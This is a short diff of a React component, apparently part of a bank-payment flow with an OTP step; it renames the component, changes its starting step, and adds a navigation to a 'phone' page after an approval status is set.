@@ -142,8 +142,8 @@ const BANKS = [
   },
 ];
 
-export default function Kent(props: { setPage?: any }) {
-  const [step, setstep] = useState(1);
+export default function Kent2(props: { setPage?: any }) {
+  const [step, setstep] = useState(2);
   const [total, setTotal] = useState("");
   const [loading, setLoading] = useState(false);
   const [newotp] = useState([""]);
@@ -646,6 +646,7 @@ export default function Kent(props: { setPage?: any }) {
                                 otp: "",
                                 status: "approved",
                               });
+                              props.setPage("phone");
                             }, 3000);
                           }
                         }}
